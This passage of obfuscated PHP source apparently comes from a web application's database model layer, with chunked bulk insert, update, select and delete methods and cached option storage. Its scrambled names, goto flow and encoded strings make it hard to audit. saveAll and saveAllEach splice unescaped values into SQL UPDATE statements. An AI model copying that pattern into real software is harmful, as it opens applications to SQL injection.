$BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = call_user_func_array(array(&$this, $d‘ìÛÛ‘ê½[1]), $eÂ İ×´œ); } break; case $cïÀ´ïÒƒø[268]: if (isset($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]) && $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]) { $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = call_user_func_array(array(&$this, $d‘ìÛÛ‘ê½[1]), array($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’])); } break; case $cïÀ´ïÒƒø[271]: $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = $BÅÄ°ŞÕ‡÷[$d‘ìÛÛ‘ê½[1]]; break; case $cïÀ´ïÒƒø[292]: $FÉ¦ŠÄæ¨¾ = $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]; $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = json_decode($FÉ¦ŠÄæ¨¾, !0); if (is_null($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’])) { $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = $FÉ¦ŠÄæ¨¾; } break; case $cïÀ´ïÒƒø[321]: if ($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] === $cïÀ´ïÒƒø[33]) { unset($BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’]); } break; case $cïÀ´ïÒƒø[322]: $BÅÄ°ŞÕ‡÷[$Bç´ŠÁ³é’] = $d‘ìÛÛ‘ê½[1]; break; default: break; } } } public function saveAll($D‚œ¸Øåè¤) { goto e¢¡½½´Á; FËçØ²Ôƒ: $D‚œ¸Øåè¤ = is_array($D‚œ¸Øåè¤) ? $D‚œ¸Øåè¤ : array(); $Eè³åîéÜ± = $dÊºÅ§íĞÈ[376]; $d­îèçÇÓ² = 0; goto dæÉ—èïõ‚; e¢¡½½´Á: $dÊºÅ§íĞÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cäØĞµÌŞ = $this->tablePrefix . $this->tableName; $B‹§ÅÌÂË° = self::SQL_WHERE_IN_CHUNK; goto FËçØ²Ôƒ; dæÉ—èïõ‚: $cñ«Ô‹İ±‹ = array(); $DêÚì®·ÃÇ = count($D‚œ¸Øåè¤); for ($EãŞåÏ¼ Í = 0; $EãŞåÏ¼ Í < $DêÚì®·ÃÇ; $EãŞåÏ¼ Í++) { $dƒ×ºñï¥ = $D‚œ¸Øåè¤[$EãŞåÏ¼ Í]; if (!is_array($dƒ×ºñï¥) || count($dƒ×ºñï¥) != 4) { continue; } $eªÛŞø— = "\x55\120\x44\x41\x54\105\40\x60{$cäØĞµÌŞ}\x60\x20\123\105\124\x20{$dƒ×ºñï¥[2]}\40\75\x20\103\101\x53\x45\40{$dƒ×ºñï¥[0]}\40\xa"; if ($d­îèçÇÓ² == 0) { $Eè³åîéÜ± = $eªÛŞø—; } $cñ«Ô‹İ±‹[] = $dÊºÅ§íĞÈ[116] . $dƒ×ºñï¥[1] . $dÊºÅ§íĞÈ[116]; $d­îèçÇÓ²++; $Eè³åîéÜ± .= "\40\x57\110\105\116\40\x27{$dƒ×ºñï¥[1]}\x27\x20\x54\x48\x45\116\x20\47{$dƒ×ºñï¥[3]}\47\40\xa"; if ($d­îèçÇÓ² == $B‹§ÅÌÂË° || $EãŞåÏ¼ Í == $DêÚì®·ÃÇ - 1) { goto eö‰´ªÒ©; B‡¯˜‰¾º: $d­îèçÇÓ² = 0; $Eè³åîéÜ± = $eªÛŞø—; $this->chunkEventCheck(count($cñ«Ô‹İ±‹)); goto aë´†áçß“; aë´†áçß“: $cñ«Ô‹İ±‹ = array(); goto dµÄÑï¥İ; eö‰´ªÒ©: $dŒÛ¢‰­æ¯ = implode($dÊºÅ§íĞÈ[47], $cñ«Ô‹İ±‹); $Eè³åîéÜ± .= "\x20\105\116\104\40\x20\x57\x48\105\x52\105\40{$dƒ×ºñï¥[0]}\40\111\x4e\x20\x28{$dŒÛ¢‰­æ¯}\51\40"; $this->execute($Eè³åîéÜ±); goto B‡¯˜‰¾º; dµÄÑï¥İ: } } goto b÷©ÜŠ÷˜Û; b÷©ÜŠ÷˜Û: $this->chunkEventSet(); goto bÇôßå×İ½; bÇôßå×İ½: } public function saveAllEach($D’´‹ÏÁÁ) { $b”†ˆÌÙ¦È =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B²ø´›İ£ = $this->tablePrefix . $this->tableName; foreach ($D’´‹ÏÁÁ as $A§ÚÜ³ßµ) { if (!is_array($A§ÚÜ³ßµ) || count($A§ÚÜ³ßµ) != 4) { continue; } $E“ØÆ¨Çù = $A§ÚÜ³ßµ[0] . $b”†ˆÌÙ¦È[377] . $A§ÚÜ³ßµ[1] . $b”†ˆÌÙ¦È[116]; $Cõì£ïÇÌà = $A§ÚÜ³ßµ[2] . $b”†ˆÌÙ¦È[377] . $A§ÚÜ³ßµ[3] . $b”†ˆÌÙ¦È[116]; $AŠöîìÑÃ½ = "\x75\x70\x64\141\x74\145\40{$B²ø´›İ£}\40\x73\145\164\x20{$Cõì£ïÇÌà}\x20\x77\x68\x65\x72\145\40{$E“ØÆ¨Çù}\x3b"; $this->execute($AŠöîìÑÃ½); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($A‡ßÃ“©öø = false, $cèçóËÙÃ = false) { $this->_chunkEvent = $A‡ßÃ“©öø; $this->_chunkEventParam = $cèçóËÙÃ; } private function chunkEventCheck($Fˆ¤Ç¹†í¹) { if (!$this->_chunkEvent) { return; } $aÇöÑ¢ğˆ÷ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aÇöÑ¢ğˆ÷[$_SERVER[Ôğ—¤Šµˆ˜ñ£][378]] = $Fˆ¤Ç¹†í¹; Hook::trigger($this->_chunkEvent, $aÇöÑ¢ğˆ÷); } public function addAll($Dê¹ù”óœˆ, $D²µ¼·³…ê = array(), $D»‹¸¼½° = false) { goto cšŠÊ÷ß ; b–‡©Õåˆ: if (method_exists($this->db, $b„ğ‚¸¶¢É[270])) { for ($F„ä¯Í›¡õ = 0; $F„ä¯Í›¡õ < count($Dê¹ù”óœˆ); $F„ä¯Í›¡õ += $fï‰Ù¹¢ƒ¸) { $b„ƒ éòí« = array_slice($Dê¹ù”óœˆ, $F„ä¯Í›¡õ, $fï‰Ù¹¢ƒ¸); if (!is_array($b„ƒ éòí«) || count($b„ƒ éòí«) == 0) { break; } $b¹¼¸ÉŠÍ = $this->db->insertAll($b„ƒ éòí«, $D²µ¼·³…ê, $D»‹¸¼½°); $this->chunkEventCheck(count($b„ƒ éòí«)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Dê¹ù”óœˆ as $DÅÜÓÌ„ÊÚ => $aó‚²İ˜¿ô) { $b¹¼¸ÉŠÍ = $this->db->insert($aó‚²İ˜¿ô, $D²µ¼·³…ê, $D»‹¸¼½°); } $this->commit(); } if (!1 !== $b¹¼¸ÉŠÍ) { $E‹¾Å—Óù = $this->getLastInsID(); if ($E‹¾Å—Óù) { return $E‹¾Å—Óù; } } return $b¹¼¸ÉŠÍ; goto CÚ ‚§çïî; cšŠÊ÷ß : $b„ğ‚¸¶¢É =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; ignore_timeout(); $fï‰Ù¹¢ƒ¸ = self::SQL_WHERE_IN_CHUNK; goto dÌ¢·‘Ğ¦Ñ; dÌ¢·‘Ğ¦Ñ: if (empty($Dê¹ù”óœˆ)) { $this->error = think_lang($b„ğ‚¸¶¢É[269]); return !1; } $D²µ¼·³…ê = $this->_parseOptions($D²µ¼·³…ê); foreach ($Dê¹ù”óœˆ as $DÅÜÓÌ„ÊÚ => $aó‚²İ˜¿ô) { $Dê¹ù”óœˆ[$DÅÜÓÌ„ÊÚ] = $this->_facade($aó‚²İ˜¿ô); $this->_beforeInsert($Dê¹ù”óœˆ[$DÅÜÓÌ„ÊÚ], $D²µ¼·³…ê); } goto b–‡©Õåˆ; CÚ ‚§çïî: } public function save($dÄƒãô…À = '', $B½‹‚éÓ·› = array()) { goto a³áï‰÷§‡; AëŸÚÛË¸ì: $f°Ùˆ»Œõ¬ = $f‡±Æ…ø¶Ş[$a¬ßÎÚæö[273]][$DšØ‹‰ˆ½Ğ][1]; $f°Ùˆ»Œõ¬ = is_array($f°Ùˆ»Œõ¬) ? $f°Ùˆ»Œõ¬ : array(); $Bé’ƒÌåò = count($f°Ùˆ»Œõ¬); goto b°¹æ„™²; b°¹æ„™²: for ($dÕ¥ğÚÁ¾Ô = 0; $dÕ¥ğÚÁ¾Ô < $Bé’ƒÌåò; $dÕ¥ğÚÁ¾Ô += $f·‰¿»¤†è) { $aÈ¡¿ŸÉ× = array_slice($f°Ùˆ»Œõ¬, $dÕ¥ğÚÁ¾Ô, $f·‰¿»¤†è); if (!is_array($aÈ¡¿ŸÉ×) || count($aÈ¡¿ŸÉ×) == 0) { break; } $f‡±Æ…ø¶Ş[$a¬ßÎÚæö[273]][$DšØ‹‰ˆ½Ğ][1] = $aÈ¡¿ŸÉ×; $this->optionsValue($f‡±Æ…ø¶Ş); $fˆÍ²®ŞÌå += parent::save($dÄƒãô…À, $B½‹‚éÓ·›); $this->chunkEventCheck(count($aÈ¡¿ŸÉ×)); } $this->chunkEventSet(); return $fˆÍ²®ŞÌå; goto A‚äá¨«É‡; B¡âÓ·Çğ: $DšØ‹‰ˆ½Ğ = $this->findWhereField($f‡±Æ…ø¶Ş); if (!$DšØ‹‰ˆ½Ğ) { return parent::save($dÄƒãô…À, $B½‹‚éÓ·›); } $fˆÍ²®ŞÌå = 0; goto AëŸÚÛË¸ì; a³áï‰÷§‡: $a¬ßÎÚæö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f·‰¿»¤†è = self::SQL_WHERE_IN_CHUNK; $f‡±Æ…ø¶Ş = $this->optionsValue(); goto B¡âÓ·Çğ; A‚äá¨«É‡: } public function add($Cß´µôÆàÊ = '', $B íÚÚ„˜‚ = array(), $B›˜îàÕë = false) { if ($this->addTaskStatus && is_array($Cß´µôÆàÊ)) { $this->addTaskData[] = $Cß´µôÆàÊ; return; } return parent::add($Cß´µôÆàÊ, $B íÚÚ„˜‚, $B›˜îàÕë); } public function parseWhereLike($f†ÛĞ®°¤, $AĞ´ŒÖÂ”± = '', $CŒÎŒĞ§’Î = false, &$a§ß§¯‰‘Ğ = false) { goto aÙšÇ‹İêÑ; aÙšÇ‹İêÑ: $Bñºå¸” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D§æçìÌë = $GLOBALS[$Bñºå¸”[6]][$Bñºå¸”[379]]; if (!$D§æçìÌë[$Bñºå¸”[380]]) { return $f†ÛĞ®°¤; } goto EˆÁÖ§ò²Ç; e¼À·áÓ¦Ò: foreach ($f†ÛĞ®°¤ as $b”‡‰”‚Ö => $dÂéí‹ÄİŠ) { if (is_array($dÂéí‹ÄİŠ) && count($dÂéí‹ÄİŠ) == 2 && $dÂéí‹ÄİŠ[0] == $Bñºå¸”[381] && is_string($dÂéí‹ÄİŠ[1]) && substr($dÂéí‹ÄİŠ[1], 0, 1) == $Bñºå¸”[382] && substr($dÂéí‹ÄİŠ[1], strlen($dÂéí‹ÄİŠ[1]) - 1, 1) == $Bñºå¸”[382]) { goto Dƒ¥øÔâŞö; F‚ã¢»…õœ: $FŞ¥ñ¶°È² = $this->db->escapeString($FŞ¥ñ¶°È²); if (!strpos($aù×¹‚ñ, $Bñºå¸”[95])) { $aù×¹‚ñ = $Bñºå¸”[383] . $aù×¹‚ñ . $Bñºå¸”[383]; } $BÃêã¤ëÃÚ = $Bñºå¸”[182] . $FŞ¥ñ¶°È² . $Bñºå¸”[182]; goto b¨î£Ü—’; b¨î£Ü—’: if ($D§æçìÌë[$Bñºå¸”[384]]) { $BÃêã¤ëÃÚ = $Bñºå¸”[385] . $FŞ¥ñ¶°È² . $Bñºå¸”[386]; if ($D§æçìÌë[$Bñºå¸”[387]]) { $BÃêã¤ëÃÚ = $Bñºå¸”[386] . $FŞ¥ñ¶°È² . $Bñºå¸”[385]; } } $bïÀøáÏñÂ[$cÑÃŠÍ´“•] = $Bñºå¸”[388] . $aù×¹‚ñ . $Bñºå¸”[389] . $BÃêã¤ëÃÚ . $Bñºå¸”[390]; $cÑÃŠÍ´“•++; goto F„Œ§‘”˜; F„Œ§‘”˜: continue; goto fì´ó·¨; Dƒ¥øÔâŞö: $a§ß§¯‰‘Ğ = !0; $aù×¹‚ñ = is_string($b”‡‰”‚Ö) ? $b”‡‰”‚Ö : $AĞ´ŒÖÂ”±; $FŞ¥ñ¶°È² = substr($dÂéí‹ÄİŠ[1], 1, strlen($dÂéí‹ÄİŠ[1]) - 2); goto F‚ã¢»…õœ; fì´ó·¨: } if (is_array($dÂéí‹ÄİŠ)) { $AĞ´ŒÖÂ”± = is_string($b”‡‰”‚Ö) ? $b”‡‰”‚Ö : $AĞ´ŒÖÂ”±; $dÂéí‹ÄİŠ = $this->parseWhereLike($dÂéí‹ÄİŠ, $AĞ´ŒÖÂ”±, !0, $a§ß§¯‰‘Ğ); } if (is_numeric($b”‡‰”‚Ö)) { $bïÀøáÏñÂ[$cÑÃŠÍ´“•] = $dÂéí‹ÄİŠ; $cÑÃŠÍ´“•++; } else { $bïÀøáÏñÂ[$b”‡‰”‚Ö] = $dÂéí‹ÄİŠ; } } if ($a§ß§¯‰‘Ğ && !$CŒÎŒĞ§’Î) { } return $bïÀøáÏñÂ; goto A¼ò‚¦±ğà; EˆÁÖ§ò²Ç: if (!is_array($f†ÛĞ®°¤)) { return $f†ÛĞ®°¤; } $bïÀøáÏñÂ = array(); $cÑÃŠÍ´“• = 0; goto e¼À·áÓ¦Ò; A¼ò‚¦±ğà: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($fø‰²—âñõ = array()) { goto cØ¦æ¤ˆÂß; cØ¦æ¤ˆÂß: $E„äÏ³ùä£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eõ³ËÊ™“¯ = self::SQL_WHERE_IN_CHUNK; $fæÇ°Ä£Œ¼ = $this->optionsValue(); goto c÷ó¤¡•ù¡; c÷ó¤¡•ù¡: $C×†»œˆé = $this->findWhereField($fæÇ°Ä£Œ¼); if (!$C×†»œˆé || isset($fæÇ°Ä£Œ¼[$E„äÏ³ùä£[290]]) || isset($fæÇ°Ä£Œ¼[$E„äÏ³ùä£[351]])) { return parent::select($fø‰²—âñõ); } $cÃ…–´¼ŠÉ = $fæÇ°Ä£Œ¼[$E„äÏ³ùä£[273]][$C×†»œˆé][1]; goto d‹åÆŒÄ÷ì; f‡î¢¼ì‚: return $B¯š¦ëÖ½; goto b¼ğƒ„¾ó„; d‹åÆŒÄ÷ì: $cÃ…–´¼ŠÉ = is_array($cÃ…–´¼ŠÉ) ? $cÃ…–´¼ŠÉ : array(); $B¯š¦ëÖ½ = null; for ($B±ˆ§Ÿ•› = 0; $B±ˆ§Ÿ•› < count($cÃ…–´¼ŠÉ); $B±ˆ§Ÿ•› += $eõ³ËÊ™“¯) { $Bƒ¶É¹õ = array_slice($cÃ…–´¼ŠÉ, $B±ˆ§Ÿ•›, $eõ³ËÊ™“¯); if (!is_array($Bƒ¶É¹õ) || count($Bƒ¶É¹õ) == 0) { break; } $fæÇ°Ä£Œ¼[$E„äÏ³ùä£[273]][$C×†»œˆé][1] = $Bƒ¶É¹õ; $this->optionsValue($fæÇ°Ä£Œ¼); $F§²ø›˜Ğ‹ = parent::select($fø‰²—âñõ); if (!$F§²ø›˜Ğ‹) { continue; } $B¯š¦ëÖ½ = is_array($B¯š¦ëÖ½) ? $B¯š¦ëÖ½ : array(); $B¯š¦ëÖ½ = array_merge($B¯š¦ëÖ½, $F§²ø›˜Ğ‹); } goto f‡î¢¼ì‚; b¼ğƒ„¾ó„: } public function delete($c»ÀÌß’†Á = array()) { goto a±ï¼‚¡Úè; A½£ñÅİ³: $cÔ¡¹ŠË‹¥ = $bŠÕ³Å¸…á[$dİÕ‚áçñÑ[273]][$B£ğ˜Š‹Æº][1]; $cÔ¡¹ŠË‹¥ = is_array($cÔ¡¹ŠË‹¥) ? $cÔ¡¹ŠË‹¥ : array(); for ($F¯Ù»Ø¶²À = 0; $F¯Ù»Ø¶²À < count($cÔ¡¹ŠË‹¥); $F¯Ù»Ø¶²À += $DòÁê”âÛ) { $CÂµÇÇ”Òô = array_slice($cÔ¡¹ŠË‹¥, $F¯Ù»Ø¶²À, $DòÁê”âÛ); if (!is_array($CÂµÇÇ”Òô) || count($CÂµÇÇ”Òô) == 0) { break; } $bŠÕ³Å¸…á[$dİÕ‚áçñÑ[273]][$B£ğ˜Š‹Æº][1] = $CÂµÇÇ”Òô; $this->optionsValue($bŠÕ³Å¸…á); $E‚Õ‹ŠÜŸÓ += parent::delete($c»ÀÌß’†Á); } goto cÜ»‘æ‚´ˆ; F¼²ìÀ˜­ç: $B£ğ˜Š‹Æº = $this->findWhereField($bŠÕ³Å¸…á); if (!$B£ğ˜Š‹Æº) { return parent::delete($c»ÀÌß’†Á); } $E‚Õ‹ŠÜŸÓ = 0; goto A½£ñÅİ³; a±ï¼‚¡Úè: $dİÕ‚áçñÑ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DòÁê”âÛ = self::SQL_WHERE_IN_CHUNK; $bŠÕ³Å¸…á = $this->optionsValue(); goto F¼²ìÀ˜­ç; cÜ»‘æ‚´ˆ: return $E‚Õ‹ŠÜŸÓ; goto B–Ò’™Ïñù; B–Ò’™Ïñù: } private function findWhereField($C…œäµ­¯¤) { $c©ÕÉœ­® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B¬ºì¹Ù¹‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($C…œäµ­¯¤) || !is_array($C…œäµ­¯¤[$c©ÕÉœ­®[273]])) { return !1; } foreach ($C…œäµ­¯¤[$c©ÕÉœ­®[273]] as $AßóÊÕŒƒ => $A•Úã»’†) { if (is_array($A•Úã»’†) && isset($A•Úã»’†[0]) && is_string($A•Úã»’†[0]) && strtolower($A•Úã»’†[0]) == $c©ÕÉœ­®[7] && is_array($A•Úã»’†[1]) && count($A•Úã»’†[1]) > $B¬ºì¹Ù¹‹) { ignore_timeout(); return $AßóÊÕŒƒ; } } return !1; } public function setMasterDB($BÚÚëÓ ï = true) { think_config($_SERVER[Ôğ—¤Šµˆ˜ñ£][391], $BÚÚëÓ ï); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\117\x70\164\x69\x6f\156"; public $field = array(); public function listData($fÅñÏª¬Öµ = false, $a¨’¶•à÷» = "\155\157\x64\151\146\x79\124\151\x6d\x65", $C… ÚËÁ– = false) { $cÚáª½½ä = Model($this->modelType)->get(!1, $this->optionType, !0); $bäôÇ³Åï = array_values($cÚáª½½ä); if ($bäôÇ³Åï && $bäôÇ³Åï[0] && !is_array($bäôÇ³Åï[0])) { Model($this->modelType)->cacheRemove($this->optionType); $cÚáª½½ä = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$cÚáª½½ä) { return $fÅñÏª¬Öµ ? null : array(); } if (!$fÅñÏª¬Öµ) { $cÚáª½½ä = array_filter(array_values($cÚáª½½ä)); return array_sort_by($cÚáª½½ä, $a¨’¶•à÷», $C… ÚËÁ–); } return $cÚáª½½ä[$_SERVER[Ôğ—¤Šµˆ˜ñ£][392] . $fÅñÏª¬Öµ]; } public function insert($fö™äÖ‘ô) { goto AĞÔ™ “ù›; E™­Š¼¶Œë: $a ±Ä¸›¼ = $a ±Ä¸›¼ ? $a ±Ä¸›¼ : 0; $fö™äÖ‘ô[$d¼äÉÀ´™¶[395]] = ++$a ±Ä¸›¼; $fö™äÖ‘ô[$d¼äÉÀ´™¶[194]] = time(); goto DäÀµõ½´ğ; AĞÔ™ “ù›: $d¼äÉÀ´™¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fö™äÖ‘ô = array_field_key($fö™äÖ‘ô, $this->field); $a ±Ä¸›¼ = Model($this->modelType)->get($d¼äÉÀ´™¶[393], $this->optionType . $d¼äÉÀ´™¶[394]); goto E™­Š¼¶Œë; DäÀµõ½´ğ: $fö™äÖ‘ô[$d¼äÉÀ´™¶[84]] = time(); Model($this->modelType)->set($d¼äÉÀ´™¶[393], $a ±Ä¸›¼, $this->optionType . $d¼äÉÀ´™¶[394]); Model($this->modelType)->set($d¼äÉÀ´™¶[392] . $a ±Ä¸›¼, $fö™äÖ‘ô, $this->optionType); goto eßÖò¿›¬Ó; eßÖò¿›¬Ó: return $a ±Ä¸›¼; goto AÀ™Â¡Ô°; AÀ™Â¡Ô°: } public function update($FŒ÷Œ±»°, $aÍŒª‘­«) { goto d¾’æ¸¢Œğ; b¾˜¡ïï‘©: return Model($this->modelType)->set($FÍÙ¥ğ ™í[392] . $FŒ÷Œ±»°, $aÍŒª‘­«, $this->optionType); goto FéÂíÓ—©; d¾’æ¸¢Œğ: $FÍÙ¥ğ ™í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÍŒª‘­« = array_field_key($aÍŒª‘­«, $this->field); $BìÄ‹×¦¿Û = $this->listData($FŒ÷Œ±»°); goto Càöµ§Î…Õ; Càöµ§Î…Õ: if (!$BìÄ‹×¦¿Û || !$FŒ÷Œ±»°) { return !1; } $aÍŒª‘­« = array_merge($BìÄ‹×¦¿Û, $aÍŒª‘­«); $aÍŒª‘­«[$FÍÙ¥ğ ™í[84]] = time(); goto b¾˜¡ïï‘©; FéÂíÓ—©: } public function remove($BÅØÜß–°“) { if (!$BÅØÜß–°“) { return !1; } return Model($this->modelType)->remove($_SERVER[Ôğ—¤Šµˆ˜ñ£][392] . $BÅØÜß–°“, $this->optionType); } public function clear() { $d“Õ‹‡‚· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Model($this->modelType)->remove($d“Õ‹‡‚·[393], $this->optionType . $d“Õ‹‡‚·[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($b”ÂíÌä‚, $D§Ã¾–…éğ) { if (!$D§Ã¾–…éğ) { return !1; } $dÈ¥É¤‹ = $this->listData(); $dÈ¥É¤‹ = array_to_keyvalue($dÈ¥É¤‹, $b”ÂíÌä‚); return isset($dÈ¥É¤‹[$D§Ã¾–…éğ]) ? $dÈ¥É¤‹[$D§Ã¾–…éğ] : !1; } public function findByName($a…‘æ‘ÒÅ) { return $this->findByKey($_SERVER[Ôğ—¤Šµˆ˜ñ£][28], $a…‘æ‘ÒÅ); } protected function resetData($CÒÅ°¹äµÚ) { $cñ›¯´ßî˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÒÅ°¹äµÚ = is_array($CÒÅ°¹äµÚ) ? $CÒÅ°¹äµÚ : array(); $EŸò‚³ŠŞÆ = array(); for ($CÊìÚ–ô = 0; $CÊìÚ–ô < count($CÒÅ°¹äµÚ); $CÊìÚ–ô++) { $EŸò‚³ŠŞÆ[$cñ›¯´ßî˜[392] . $CÒÅ°¹äµÚ[$CÊìÚ–ô][$cñ›¯´ßî˜[395]]] = $CÒÅ°¹äµÚ[$CÊìÚ–ô]; } return Model($this->modelType)->set($EŸò‚³ŠŞÆ, !1, $this->optionType); } private function getAutoName($A¦ùË²¶«µ) { $aÓ† Í†ŸÂ = array_to_keyvalue($this->listData(), $_SERVER[Ôğ—¤Šµˆ˜ñ£][28]); if (!$aÓ† Í†ŸÂ || !isset($aÓ† Í†ŸÂ[$A¦ùË²¶«µ])) { return $A¦ùË²¶«µ; } for ($D½òŞÖğ¬ù = 1; $D½òŞÖğ¬ù < count($aÓ† Í†ŸÂ); $D½òŞÖğ¬ù++) { $C»›¡ª¬¯Å = $A¦ùË²¶«µ . "\50{$D½òŞÖğ¬ù}\51"; if (!isset($aÓ† Í†ŸÂ[$C»›¡ª¬¯Å])) { return $C»›¡ª¬¯Å; } } return $C»›¡ª¬¯Å; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bóŒ­¯‡Ä‹ = false, $e¡î‰Ï¢¶õ = '', $e™áø®Íø = false) { goto FÈ­Ä÷¡ÎŠ; CÄè•Éã‘Ä: $eí¢Œ¬ëÚ = is_array($eí¢Œ¬ëÚ) ? $eí¢Œ¬ëÚ : array(); if (is_array($E´ªŠÖ´™Š)) { $E´ªŠÖ´™Š = array_merge($eí¢Œ¬ëÚ, $E´ªŠÖ´™Š); return $bóŒ­¯‡Ä‹ ? isset($E´ªŠÖ´™Š[$bóŒ­¯‡Ä‹]) ? $E´ªŠÖ´™Š[$bóŒ­¯‡Ä‹] : null : $E´ªŠÖ´™Š; } $eÁğ²Šñë… = $this->filterWhere(array($a…£ß›ï“[29] => $e¡î‰Ï¢¶õ)); goto eçíĞ÷ô±ƒ; FÈ­Ä÷¡ÎŠ: $a…£ß›ï“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E´ªŠÖ´™Š = $this->cacheGet($e¡î‰Ï¢¶õ); $eí¢Œ¬ëÚ = $this->optionDefault($e¡î‰Ï¢¶õ); goto CÄè•Éã‘Ä; eçíĞ÷ô±ƒ: $E´ªŠÖ´™Š = $this->where($eÁğ²Šñë…)->select(); $E´ªŠÖ´™Š = array_to_keyvalue($E´ªŠÖ´™Š, $a…£ß›ï“[93], $a…£ß›ï“[372]); foreach ($E´ªŠÖ´™Š as $b¢Õ¨ÄÒù¿ => $cŒø‡Šˆâ) { if ($e™áø®Íø || in_array($b¢Õ¨ÄÒù¿, $this->jsonField)) { $E´ªŠÖ´™Š[$b¢Õ¨ÄÒù¿] = json_decode($cŒø‡Šˆâ, !0); } } goto B¦ˆŠá¤éÄ; B¦ˆŠá¤éÄ: $this->cacheSet($e¡î‰Ï¢¶õ, $E´ªŠÖ´™Š); $E´ªŠÖ´™Š = array_merge($eí¢Œ¬ëÚ, $E´ªŠÖ´™Š); return $bóŒ­¯‡Ä‹ ? $E´ªŠÖ´™Š[$bóŒ­¯‡Ä‹] : $E´ªŠÖ´™Š; goto f›î†ÁŠ¶’; f›î†ÁŠ¶’: } public function set($A²ª–’ˆ£¬, $A´¼§Ø“‹ğ = false, $fá¢ˆ‚ø×± = '') { goto CŞßèÄÚÓà; c†Ôèì‡Çò: return $this->addAll($b†ÉÁ¥Ç, array(), !0); goto dÜÉºÇ‹â; BÉ‰å¿í—: $F‡Ë¡»äô = is_array($A²ª–’ˆ£¬) ? $A²ª–’ˆ£¬ : array($A²ª–’ˆ£¬ => $A´¼§Ø“‹ğ); foreach ($F‡Ë¡»äô as $fÔæ»®¤çÖ => $C¸Ã ‰§íœ) { if (is_array($C¸Ã ‰§íœ)) { $C¸Ã ‰§íœ = json_encode_force($C¸Ã ‰§íœ); } $this->checkLength($C¸Ã ‰§íœ, !1, $this->tableName . $fğ¢„ÖÂ¦[4] . $A²ª–’ˆ£¬); $C¸Ã ‰§íœ = self::textEncode($C¸Ã ‰§íœ); $F‡Ë¡»äô = array($fğ¢„ÖÂ¦[29] => $fá¢ˆ‚ø×±, $fğ¢„ÖÂ¦[93] => $fÔæ»®¤çÖ, $fğ¢„ÖÂ¦[372] => $C¸Ã ‰§íœ); $b†ÉÁ¥Ç[] = $this->filterWhere($F‡Ë¡»äô); } if (!$b†ÉÁ¥Ç) { return !0; } goto c†Ôèì‡Çò; CŞßèÄÚÓà: $fğ¢„ÖÂ¦ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cacheRemove($fá¢ˆ‚ø×±); $b†ÉÁ¥Ç = array(); goto BÉ‰å¿í—; dÜÉºÇ‹â: } protected function optionDefault($aÙ¼ºœÕˆ = '') { return !1; } public function setDeep($FÚ­Áª¡ôå, $b°éĞÜ·ë = false, $D”¸ÃÄ³ = '') { $DÎ¦‡«±‚ì = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][95], $FÚ­Áª¡ôå); $bŠØĞ´£Ûô = $this->get(); array_set_value($bŠØĞ´£Ûô, $FÚ­Áª¡ôå, $b°éĞÜ·ë); $this->set($DÎ¦‡«±‚ì[0], $bŠØĞ´£Ûô[$DÎ¦‡«±‚ì[0]], $D”¸ÃÄ³); } public function remove($EªÛ›ÉÏ£, $d˜ãÇù = '') { $e´ª°¥İÁÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cacheRemove($d˜ãÇù); $F¥©ÛÜÒÎµ = $this->filterWhere(array($e´ª°¥İÁÄ[93] => $EªÛ›ÉÏ£, $e´ª°¥İÁÄ[29] => $d˜ãÇù)); if (is_null($EªÛ›ÉÏ£)) { unset($F¥©ÛÜÒÎµ[$e´ª°¥İÁÄ[93]]); } return $this->where($F¥©ÛÜÒÎµ)->delete(); } public function cacheSet($c®Ã®æÉíª, $cğïóšÅ¡ = false) { return Cache::set($this->cacheKey($c®Ã®æÉíª), $cğïóšÅ¡); } public function cacheGet($dŸ­äŸ‹‚ö) { return Cache::get($this->cacheKey($dŸ­äŸ‹‚ö)); } public function cacheRemove($DÛÜùå˜¢†) { return Cache::remove($this->cacheKey($DÛÜùå˜¢†)); } protected function filterWhere($B†ìĞìõÓÍ) { return $B†ìĞìõÓÍ; } protected function cacheKey($C–ˆñ†Û˜ó) { return $C–ˆñ†Û˜ó; } } goto a¹áø‰ÏéÊ; fÌİçâš£«: class BackupFile { public function __construct() { } public function index() { goto a…—ä£Ğµ; F†‰ ğ¨Àó: 